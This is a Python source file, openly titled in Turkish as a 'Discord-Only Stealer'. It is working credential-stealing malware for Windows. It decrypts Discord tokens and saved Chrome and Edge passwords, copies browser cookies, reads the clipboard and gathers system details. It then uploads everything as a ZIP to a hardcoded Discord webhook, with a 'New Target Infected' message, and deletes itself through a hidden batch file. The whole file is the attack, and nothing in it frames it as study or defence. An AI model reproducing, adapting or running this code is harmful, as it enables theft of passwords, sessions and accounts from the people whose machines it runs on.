"""
Discord-Only Stealer - Eron4u Connectsiz
Tüm verileri Discord webhook'a RAR olarak gönderir
"""

import os
import sys
import json
import base64
import subprocess
import platform
import io
import tempfile
import uuid
import shutil
import zipfile

# Discord Webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1516836893025636523/y6F7e7pYMhXZtzPLT5Je_Xa-198EfaFTH0X05mgECYNmhMCYfcttts00Y1i7BGrCMS1B"

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False
    win32crypt = None


def debug_print(msg):
    """Debug print"""
    print(f"[DEBUG] {msg}")


def get_system_info():
    """Get system information"""
    info = {
        "hostname": platform.node(),
        "username": os.getenv("USERNAME", "Unknown"),
        "os": platform.system() + " " + platform.release(),
        "architecture": platform.machine(),
        "hwid": None,
        "public_ip": None
    }
    
    try:
        import subprocess
        hwid = subprocess.check_output(
            'wmic csproduct get uuid',
            creationflags=0x08000000,
            stderr=subprocess.DEVNULL
        ).decode().split('\n')[1].strip()
        info["hwid"] = hwid
    except:
        pass
    
    try:
        if HAS_REQUESTS:
            r = requests.get("https://api.ipify.org", timeout=3)
            info["public_ip"] = r.text.strip()
    except:
        pass
    
    return info


def get_discord_tokens():
    """Get Discord tokens from browser storage"""
    import sqlite3
    from Crypto.Cipher import AES
    import win32crypt
    
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"),
    ]
    
    for path in paths:
        if not os.path.exists(path):
            continue
        
        try:
            local_state = os.path.join(os.path.dirname(os.path.dirname(path)), "Local State")
            if not os.path.exists(local_state):
                continue
            
            with open(local_state, 'r') as f:
                data = json.load(f)
            
            encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            for root, dirs, files in os.walk(path):
                for file in files:
                    if not (file.endswith('.ldb') or file.endswith('.log')):
                        continue
                    
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        import re
                        matches = re.findall(r'dQw4w9WgXcQ:([^"\\s]+)', content)
                        for match in matches:
                            try:
                                encrypted = base64.b64decode(match)
                                iv = encrypted[3:15]
                                payload = encrypted[15:]
                                cipher = AES.new(key, AES.MODE_GCM, iv)
                                token = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8')
                                tokens.append(token)
                            except:
                                pass
                    except:
                        pass
        except:
            pass
    
    return tokens


def get_passwords():
    """Get saved passwords from browser"""
    passwords = []
    
    try:
        import sqlite3
        import shutil
        
        # Chrome passwords
        chrome_db = os.path.join(
            os.getenv('LOCALAPPDATA'),
            "Google", "Chrome", "User Data", "Default", "Login Data"
        )
        
        if os.path.exists(chrome_db):
            temp_db = os.path.join(tempfile.gettempdir(), "chrome_login.db")
            shutil.copy2(chrome_db, temp_db)
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted = row
                    try:
                        # Decrypt password using DPAPI
                        decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted.decode('utf-8')
                        })
                    except:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": "ENCRYPTED"
                        })
                
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    
    return passwords


def get_cookies():
    """Get cookies from browser"""
    cookies = []
    
    try:
        import sqlite3
        
        chrome_db = os.path.join(
            os.getenv('LOCALAPPDATA'),
            "Google", "Chrome", "User Data", "Default", "Cookies"
        )
        
        if os.path.exists(chrome_db):
            temp_db = os.path.join(tempfile.gettempdir(), "chrome_cookies.db")
            shutil.copy2(chrome_db, temp_db)
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                
                for row in cursor.fetchall():
                    cookies.append({
                        "domain": row[0],
                        "name": row[1],
                        "value": row[2]
                    })
                
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    
    return cookies


def get_all_browser_cookies(temp_dir):
    """Get cookies from all browsers"""
    browsers = [
        ("Chrome", os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data", "Default", "Cookies")),
        ("Edge", os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data", "Default", "Cookies")),
    ]
    
    for browser_name, db_path in browsers:
        if not os.path.exists(db_path):
            continue
        
        try:
            import sqlite3
            import shutil
            
            temp_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}.db")
            shutil.copy2(db_path, temp_db)
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
                
                with open(os.path.join(temp_dir, f"cookies_{browser_name}.txt"), 'w', encoding='utf-8') as f:
                    for row in cursor.fetchall():
                        f.write(f"Domain: {row[0]} | Name: {row[1]} | Value: {row[2]} | Expires: {row[3]}\n")
                
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
        except:
            pass


def get_all_browser_passwords(temp_dir):
    """Get passwords from all browsers"""
    browsers = [
        ("Chrome", os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data", "Default", "Login Data")),
        ("Edge", os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data", "Default", "Login Data")),
    ]
    
    for browser_name, db_path in browsers:
        if not os.path.exists(db_path):
            continue
        
        try:
            import sqlite3
            import shutil
            
            temp_db = os.path.join(tempfile.gettempdir(), f"login_{browser_name}.db")
            shutil.copy2(db_path, temp_db)
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                with open(os.path.join(temp_dir, f"passwords_{browser_name}.txt"), 'w', encoding='utf-8') as f:
                    for row in cursor.fetchall():
                        url, username, encrypted = row
                        try:
                            decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
                            f.write(f"URL: {url} | User: {username} | Pass: {decrypted.decode('utf-8')}\n")
                        except:
                            f.write(f"URL: {url} | User: {username} | Pass: ENCRYPTED\n")
                
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
        except:
            pass


def get_clipboard():
    """Get clipboard content"""
    try:
        import subprocess
        result = subprocess.run(
            'powershell -Command "Get-Clipboard"',
            capture_output=True,
            text=True,
            creationflags=0x08000000
        )
        return result.stdout[:500] if result.stdout else "Empty"
    except:
        return "Error"


def create_rar_archive(data, output_path):
    """Create RAR archive with all stolen data using 7z"""
    try:
        # Create temp directory for files
        temp_dir = tempfile.mkdtemp()
        
        # System info
        system_info = data.get("system", {})
        with open(os.path.join(temp_dir, "system_info.txt"), 'w', encoding='utf-8') as f:
            f.write(json.dumps(system_info, indent=2))
        
        # Discord tokens
        if data.get("discord_tokens"):
            with open(os.path.join(temp_dir, "discord_tokens.txt"), 'w', encoding='utf-8') as f:
                for token in data["discord_tokens"]:
                    f.write(f"{token[:50]}...\n" if len(token) > 50 else f"{token}\n")
        
        # Passwords (all, not limited)
        if data.get("passwords"):
            with open(os.path.join(temp_dir, "passwords.txt"), 'w', encoding='utf-8') as f:
                for p in data["passwords"]:
                    f.write(f"URL: {p.get('url', 'N/A')} | User: {p.get('username', 'N/A')} | Pass: {p.get('password', 'N/A')}\n")
        
        # Cookies (all, not limited)
        if data.get("cookies"):
            with open(os.path.join(temp_dir, "cookies.txt"), 'w', encoding='utf-8') as f:
                for c in data["cookies"]:
                    f.write(f"Domain: {c.get('domain', 'N/A')} | Name: {c.get('name', 'N/A')} | Value: {c.get('value', 'N/A')}\n")
        
        # Clipboard
        if data.get("clipboard"):
            with open(os.path.join(temp_dir, "clipboard.txt"), 'w', encoding='utf-8') as f:
                f.write(data["clipboard"])
        
        # Get all browsers passwords
        get_all_browser_passwords(temp_dir)
        
        # Get all browser cookies
        get_all_browser_cookies(temp_dir)
        
        # Create RAR using 7z
        rar_path = output_path
        temp_dir_escaped = temp_dir.replace('\\', '/')
        
        cmd = f'7z a -tzip "{rar_path}" "{temp_dir_escaped}/*" -mx9'
        result = subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
        
        # Clean up temp dir
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        if os.path.exists(rar_path):
            debug_print(f"RAR archive created: {rar_path}")
            with open(rar_path, 'rb') as f:
                return f.read()
        else:
            debug_print("Failed to create RAR archive")
            return None
            
    except Exception as e:
        debug_print(f"RAR creation error: {e}")
        # Fallback to ZIP if 7z fails
        return create_zip_archive(data)


def create_zip_archive(data):
    """Create ZIP archive with all stolen data"""
    archive = io.BytesIO()
    
    with zipfile.ZipFile(archive, 'w', zipfile.ZIP_DEFLATED) as zf:
        # System info
        zf.writestr("system_info.txt", json.dumps(data.get("system", {}), indent=2))
        
        # Discord tokens
        if data.get("discord_tokens"):
            tokens_text = "\n".join([
                f"Token: {t[:50]}..." if len(t) > 50 else t
                for t in data["discord_tokens"]
            ])
            zf.writestr("discord_tokens.txt", tokens_text.encode('utf-8'))
        
        # Passwords (all, not limited)
        if data.get("passwords"):
            pw_text = "\n".join([
                f"URL: {p.get('url', 'N/A')} | User: {p.get('username', 'N/A')} | Pass: {p.get('password', 'N/A')}"
                for p in data["passwords"]
            ])
            zf.writestr("passwords.txt", pw_text.encode('utf-8'))
        
        # Cookies (all, not limited)
        if data.get("cookies"):
            cookie_text = "\n".join([
                f"Domain: {c.get('domain', 'N/A')} | Name: {c.get('name', 'N/A')} | Value: {c.get('value', 'N/A')}"
                for c in data["cookies"]
            ])
            zf.writestr("cookies.txt", cookie_text.encode('utf-8'))
        
        # Clipboard
        if data.get("clipboard"):
            zf.writestr("clipboard.txt", data["clipboard"])
    
    archive.seek(0)
    return archive.getvalue()


def send_to_discord(filename, file_data, message):
    """Send file and message to Discord webhook"""
    try:
        if HAS_REQUESTS:
            payload = {'content': message}
            files = {'file': (filename, file_data, 'application/zip')}
            r = requests.post(DISCORD_WEBHOOK, data=payload, files=files, timeout=30)
            return r.status_code in [200, 204]
        else:
            return False
    except Exception as e:
        debug_print(f"Discord send error: {e}")
        return False


def main():
    """Main function - steal data and send to Discord"""
    debug_print("Starting Discord-only stealer...")
    
    # Collect data
    data = {
        "system": get_system_info(),
        "discord_tokens": get_discord_tokens(),
        "passwords": get_passwords(),
        "cookies": get_cookies(),
        "clipboard": get_clipboard()
    }
    
    summary = {
        "tokens": len(data["discord_tokens"]),
        "passwords": len(data["passwords"]),
        "cookies": len(data["cookies"])
    }
    
    debug_print(f"Collected: {summary}")
    
    # Create ZIP archive
    zip_data = create_zip_archive(data)
    
    # Send to Discord
    hostname = data["system"].get("hostname", "Unknown")
    username = data["system"].get("username", "Unknown")
    
    filename = f"stealer_{hostname}_{username}_{uuid.uuid4().hex[:8]}.zip"
    message = f"""**New Target Infected**
Username: `{username}`
Hostname: `{hostname}`
OS: `{data['system'].get('os', 'N/A')}`
IP: `{data['system'].get('public_ip', 'N/A')}`

**Results:**
Discord Tokens: {summary['tokens']}
Passwords: {summary['passwords']}
Cookies: {summary['cookies']}
"""
    
    success = send_to_discord(filename, zip_data, message)
    
    if success:
        debug_print(f"Data sent to Discord successfully ({filename})")
    else:
        debug_print("Failed to send data to Discord")
    
    # Self delete
    try:
        script_path = os.path.abspath(sys.argv[0])
        bat_path = os.path.join(tempfile.gettempdir(), f"delete_{os.path.basename(script_path)}.bat")
        bat_content = f'''@echo off
:loop
del "{script_path}" >nul 2>&1
if exist "{script_path}" (
    timeout /t 1 /nobreak >nul
    goto loop
)
del "{bat_path}" >nul 2>&1
'''
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        subprocess.Popen([bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        debug_print("Self-deletion scheduled")
    except Exception as e:
        debug_print(f"Self-delete failed: {e}")
    
    debug_print("Exit complete.")


if __name__ == "__main__":
    main()
